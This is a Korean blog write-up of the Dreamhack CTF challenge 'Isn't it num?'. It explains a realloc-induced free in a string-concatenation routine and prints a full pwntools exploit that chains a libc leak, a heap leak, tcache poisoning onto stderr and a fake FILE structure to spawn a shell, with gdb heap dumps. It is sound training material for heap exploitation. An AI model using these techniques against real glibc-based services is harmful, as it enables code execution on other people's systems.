---
title: "[DREAMHACK] Isn't it num? writeup"
date: 2026-03-08 22:20:00
categories: Essay
tags: [writeup]
---

이 문제는 내가 풀다 막혀 롸업을 봤다.
<!--more-->

# 정적 분석
```bash
                 w _ITM_deregisterTMCloneTable
                 w _ITM_registerTMCloneTable
                 w __cxa_finalize@GLIBC_2.2.5
                 w __gmon_start__
                 U __isoc99_scanf@GLIBC_2.7
                 U __libc_start_main@GLIBC_2.34
                 U exit@GLIBC_2.2.5
                 U malloc@GLIBC_2.2.5
                 U printf@GLIBC_2.2.5
                 U puts@GLIBC_2.2.5
                 U read@GLIBC_2.2.5
                 U realloc@GLIBC_2.2.5
                 U setvbuf@GLIBC_2.2.5
                 U strcat@GLIBC_2.2.5
                 U strlen@GLIBC_2.2.5
...
0000000000005010 D _edata
0000000000005020 B stdout@GLIBC_2.2.5
0000000000005030 B stdin@GLIBC_2.2.5
0000000000005040 B stderr@GLIBC_2.2.5
0000000000005048 b completed.0
0000000000005060 B data
0000000000005160 B _end
```

```bash
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

코드가 길다.  
`cmd` 변수에 들어가는 옵션별로 빠르게 설명하고 넘어가겠다.  

## `cmd> 1`

1을 입력한 경우, 초기 `idx`, `type`을 지정하여 공간을 설정한다.  
점유된 상태인지 확인한다. 또한 `idx`는 `unsigned int`로 바뀐 뒤  
`bounds_check()`에 들어가 `0x10`보다 작아야 한다는 조건을 통과해야 한다.
```c
        printf("idx > ");
        __isoc99_scanf("%d", &v9);
        if ( !bounds_check(v9) )
          goto LABEL_8;
        printf("type > ");
        __isoc99_scanf("%d", &v10);
        if ( *((_DWORD *)&data + 4 * v9) )
        {
          puts("Already filled");
        }
```

```c
// 부호 없는 값으로 변환되어서 들어감, 문제 없음
_BOOL8 __fastcall bounds_check(unsigned int a1)
{
  return a1 < 0x10;
}
```

`type` 별 설명은 생략한다. 다만, `11`에 대해서 중점적으로 다룰 것이다.  
```c
            case 11:
              printf("len > ");
              __isoc99_scanf("%u", &v11);
              printf("value > ");
              v3 = v9;
              *((_QWORD *)&unk_5068 + 2 * v3) = malloc((unsigned int)(v11 + 1));
              i = 0;
              break;
```
길이/값을 입력받는다.  
할당되는 메모리는 `len+1`임을 기억하자.  

`IDA`가 좀 디컴파일을 못하긴 하지만 나보단 낫다. 그런 마인드로  
break가 끝난 뒤 아래 코드는 이런 의미를 가진다.  
```c
          while ( 1 )
          {
            if ( i >= v11 )
              goto LABEL_2;
            read(0, (void *)(*((_QWORD *)&unk_5068 + 2 * v9) + i), 1uLL);
            if ( *(_BYTE *)(*((_QWORD *)&unk_5068 + 2 * v9) + i) == 10 )
              break;
            ++i;
          }
          *(_BYTE *)(*((_QWORD *)&unk_5068 + 2 * v9) + i) = 0;
```
길이(`len`)만큼 `read()`한다.  
읽고 나서 엔터(`0xa`)가 있다면 중지하고 해당 위치를 널 바이트로 종결시켜준다.  
딱히 문제는 없다. 엔터를 입력하지 않는다면 나중에 사용 가능할듯 ㅋ

## `cmd> 2`
```c
    case 2:                                   // cmd2: show
        printf("idx > ");
        __isoc99_scanf("%d", &v11);
        if ( !bounds_check(v11) )
          goto LABEL_8;
```

2번도 1번과 비슷한 양상을 띄고 있다.  
그러나 여기선 `idx`만 받는다.  
해당 타입에 접근해서 올바른 형식으로 출력한다.  

## `cmd> 3`
```c
    printf("idx1 > ");
      __isoc99_scanf("%d", &v10);
      printf("idx2 > ");
      __isoc99_scanf("%d", &v11);
      if ( !bounds_check(v10) || !bounds_check(v11) )
      {
LABEL_8:
        puts("Out of bounds");
      }
```
서로 다른 두 `idx`를 받고 범위를 확인한다.  

```c
v4 = *((_DWORD *)&data + 4 * v10);
```
타입은 더 큰 타입 기준, 여기서 `type confusion`을 의심했다.  
그런데 안 되더라.  
그야 더 써먹을 부분이 없으니까.  

이번엔 이렇게 생겼다.  

```c
    case 11:
            v5 = strlen(*((const char **)&unk_5068 + 2 * v10));
            v6 = v5 + strlen(*((const char **)&unk_5068 + 2 * v11)) + 1;
            LODWORD(v5) = v10;
            *((_QWORD *)&unk_5068 + 2 * (int)v5) = realloc(*((void **)&unk_5068 + 2 * v10), v6);
            strcat(*((char **)&unk_5068 + 2 * v10), *((const char **)&unk_5068 + 2 * v11));
            break;
```
두 문자열을 더하고 `realloc`한 녀석에 저장한다.  
`realloc`이 하는 동작은 다음과 같다:

### 1. 제자리 확장
- 청크 A가 그대로, 확장됨(뒤에 청크가 없음)

### 2. free()
- 뒤에 청크가 있음, 또는 확장이 안 되는 경우
- 더 큰 청크를 다른 위치에 할당함, 기존 내용 복사
- free()

즉, 청크 두 개 큰 거 만들어두고  
앞 청크를 `realloc()`하면 `free()`할 수 있다.  

[>> _int_realloc 소스 링크 <<](https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4816)

대략적으로 코드를 발췌하면 다음과 같다.  

```c
/* allocate, copy, free */
      else
        {
          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);
          if (newmem == 0)
            return 0; /* propagate failure */

          newp = mem2chunk (newmem);
          newsize = chunksize (newp);

          /*
             Avoid copy if newp is next chunk after oldp.
           */
          if (newp == next)
            {
              newsize += oldsize;
              newp = oldp;
            }
          else
            {
	      void *oldmem = chunk2mem (oldp);
	      size_t sz = memsize (oldp);
	      (void) tag_region (oldmem, sz);
	      newmem = tag_new_usable (newmem);
	      memcpy (newmem, oldmem, sz);
	      _int_free (av, oldp, 1);
	      check_inuse_chunk (av, newp);
	      return newmem;
            }
        }
```
이전 코드에는 `top chunk`로의 확장,  
다음 청크로의 확장,  
또는 이 둘이 불가능할 경우,  
새 메모리를 만들고 내용을 복사한 뒤 `old chunk`를 `free()`한다.    

시나리오를 요약하면 다음과 같다.

1. 청크 하나를 `unsorted bin`으로 보내 `libc leak`
2. 청크 하나를 `tcache bin`으로 보내 `heap base leak`
3. `tcache poisoning`으로 `stderr` 할당 유도
4. `exit()`

이것은 `realloc()`을 이용한 `free()`가 가능하기에 쉽게 되었다.

```py
#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.binary = elf = ELF('./prob')
#context.log_level = "debug"
context.terminal = ['tmux', 'splitw', '-h']
HOST, PORT = "host8.dreamhack.games 13596".split()

def slog(n, a): return info(": ".join([n, hex(a)]))

s       = lambda data               :p.send(data)
sa      = lambda delim, data        :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim, data        :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delim, drop=True   :p.recvuntil(delim, drop)
l64     = lambda                    :u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

if args.REMOTE:
    p = remote(HOST, PORT)
    libc = ELF('./libc.so.6') # or other exact path
else:
    p = process(env={"LD_PRELOAD":"./libc.so.6"}) # or env can be added
    libc = ELF('./libc.so.6')#ELF('/usr/lib/x86_64-linux-gnu/libc.so')

def create(idx, t, v=None, l=None): # v = value, l = len
    sla(b'cmd > ', b'1')
    sla(b'idx > ', str(idx).encode())
    sla(b'type > ', str(t).encode())

    if t == 11:
        sla(b'len > ', str(l).encode())
        sa(b'value > ', v if isinstance(v, bytes) else v.encode())
    else:
        sla(b'value > ', str(v).encode())

def show(idx):
    sla(b'cmd > ', b'2')
    sla(b'idx > ', str(idx).encode())

def add(idx1, idx2):
    sla(b'cmd > ', b'3')
    sla(b'idx1 > ', str(idx1).encode())
    sla(b'idx2 > ', str(idx2).encode())

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

# 적당히 큰 청크 2개
create(0, 11, b'A'*0x10000, 0x10000)
create(1, 11, b'B'*0x100, 0x100)

add(0, 1) # 이걸로 unsorted bin에 보내기
# 빈 거 하나 올리고
# 가장 작은 청크 아래 올리고
# 아래에 unsorted bin 있으니까 null 종결까지 쭉 읽기
create(2, 11, b'', 0)
show(2)

libc.address = uu64(r(6)) - 0x21a460 # main_arena offset
slog("libc_base", libc.address)
system = libc.sym["system"]
slog("system", system)
iowfile = libc.sym["_IO_wfile_jumps"]
slog("IO_wfile_jumps", iowfile)
stderr = libc.sym["_IO_2_1_stderr_"]
slog("stderr", stderr)

# tcache로 하나 보낼 거
create(3, 11, b'A'*0x10, 0x10) # 0x20, 또 작은 거 올린 뒤
add(3, 0) # 크게 만들어서 넣기
# -> tcache bin으로 보낼거, 큰 친구는 largebin으로 감
'''

'''

create(4, 11, b'', 0)
show(4)

# safe linking
heap = (u64(rl().strip().ljust(8, b'\x00')) << 12)
slog("heap_base", heap)
# 5, 6, 7
create(5, 11, b'A'*0x10, 0x10)
for i in range(6, 8):
    create(i, 11, b'A'*0x100, 0x100)
# tcache: 5, 6, 7
for i in range(7, 4, -1):
    add(i, 0)
fake_fsop = libc.sym["_IO_2_1_stderr_"]

pay = FSOP_struct(
    flags = u64(b"  sh\x00\x00\x00\x00"),
    lock = fake_fsop + 0x1000,
    _wide_data = fake_fsop-0x10,
    _markers = system,
    _unused2 = p32(0) + p64(0) + p64(fake_fsop - 0x8),
    vtable = iowfile - 0x40,
    _mode = 0xffffffff
)
print(hex(len(pay)))

create(8, 11, b'A'*0x18 + p64(0x111) + p64((stderr) ^ (heap >> 12)) + b'\n', -1)
create(9, 11, b'B'*0x100, 0x100) # 빼고 stderr 꺼낼 준비
create(10, 11, pay.ljust(0x100, b'\x00') + b'\n', 0x100)

#gdb.attach(p);pause()

sl(b'0')

p.interactive()
```

코드에 주석을 적당히 넣어 이해에 도움이 되려고 노력했다.  

# 동적 분석
... 여기서는 각 청크를 다룬 매 동작을 `gdb`로 멈춘 뒤 기록했다.  

```py
create(0, 11, b'A'*0x10000, 0x10000)
create(1, 11, b'B'*0x100, 0x100)
```

```bash
Allocated chunk | PREV_INUSE
Addr: 0x615f81329000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x615f81329290
Size: 0x10010 (with flag bits: 0x10011)

Allocated chunk | PREV_INUSE
Addr: 0x615f813392a0
Size: 0x110 (with flag bits: 0x111)

Top chunk | PREV_INUSE
Addr: 0x615f813393b0
Size: 0x10c50 (with flag bits: 0x10c51)
```
...

```py
add(0, 1) 
create(2, 11, b'', 0)
show(2)

libc.address = uu64(r(6)) - 0x21a460 # main_arena offset
slog("libc_base", libc.address)
system = libc.sym["system"]
slog("system", system)
iowfile = libc.sym["_IO_wfile_jumps"]
slog("IO_wfile_jumps", iowfile)
stderr = libc.sym["_IO_2_1_stderr_"]
slog("stderr", stderr)
```

```bash
Allocated chunk | PREV_INUSE
Addr: 0x615f81329000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x615f81329290
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x615f813292b0
Size: 0xfff0 (with flag bits: 0xfff1)
fd: 0x7e490ae19ce0
bk: 0x7e490ae19ce0

Allocated chunk
Addr: 0x615f813392a0
Size: 0x110 (with flag bits: 0x110)

Allocated chunk | PREV_INUSE
Addr: 0x615f813393b0
Size: 0x10110 (with flag bits: 0x10111)

Top chunk | PREV_INUSE
Addr: 0x615f813494c0
Size: 0xb40 (with flag bits: 0xb41)

///...///...///...///

unsortedbin
all: 0x615f813292b0 —▸ 0x7e490ae19ce0 ◂— 0x615f813292b0
```
...

```py
create(3, 11, b'A'*0x10, 0x10)
add(3, 0)

create(4, 11, b'', 0)
show(4)
```

```bash
Allocated chunk | PREV_INUSE
Addr: 0x615f81329000
Size: 0x290 (with flag bits: 0x291)

Allocated chunk | PREV_INUSE
Addr: 0x615f81329290
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE
Addr: 0x615f813292b0
Size: 0x20 (with flag bits: 0x21)

Free chunk (largebins) | PREV_INUSE
Addr: 0x615f813292d0
Size: 0xffd0 (with flag bits: 0xffd1)
fd: 0x7e490ae1a450
bk: 0x7e490ae1a450
fd_nextsize: 0x615f813292d0
bk_nextsize: 0x615f813292d0

Allocated chunk
Addr: 0x615f813392a0
Size: 0x110 (with flag bits: 0x110)

Allocated chunk | PREV_INUSE
Addr: 0x615f813393b0
Size: 0x10110 (with flag bits: 0x10111)

Allocated chunk | PREV_INUSE
Addr: 0x615f813494c0
Size: 0x10120 (with flag bits: 0x10121)

Top chunk | PREV_INUSE
Addr: 0x615f813595e0
Size: 0x20a20 (with flag bits: 0x20a21)
```

...(실수로 tmux 닫아서 주소가 다름,)   
(하지만 내용 이해에는 그렇게 큰 어려움이 되지 않는다고 판단)


```py
heap = (u64(rl().strip().ljust(8, b'\x00')) << 12)
slog("heap_base", heap)
# 5, 6, 7
create(5, 11, b'A'*0x10, 0x10)
for i in range(6, 8):
    create(i, 11, b'A'*0x100, 0x100)
pause()
# tcache: 5, 6, 7
for i in range(7, 4, -1):
    add(i, 0)
fake_fsop = libc.sym["_IO_2_1_stderr_"]

pay = FSOP_struct(
    flags = u64(b"  sh\x00\x00\x00\x00"),
    lock = fake_fsop + 0x1000,
    _wide_data = fake_fsop-0x10,
    _markers = system,
    _unused2 = p32(0) + p64(0) + p64(fake_fsop - 0x8),
    vtable = iowfile - 0x40,
    _mode = 0xffffffff
)
print(hex(len(pay)))
```

```bash
tcachebins
0x20 [  1]: 0x5f4366e2d2e0 ◂— 0
0x110 [  2]: 0x5f4366e2d300 —▸ 0x5f4366e2d410 ◂— 0
fastbins
empty
unsortedbin
empty
smallbins
empty
largebins
0xa000-0xfff0: 0x5f4366e2d510 —▸ 0x7fa31581a450 ◂— 0x5f4366e2d510
```

---
필요한 건 여기까지라고 판단했다.  
힙 익스 쪽을 더 공부해야겠다..  
나름 고생을 많이 했는데 롸업 퀄이 떨어져서 아쉽다.  
주석도 제대로 넣다 말다 해서 이해에 방해가 될 것 같다. 다시 보니까..  


잘못된 점이 있으면 알려주세요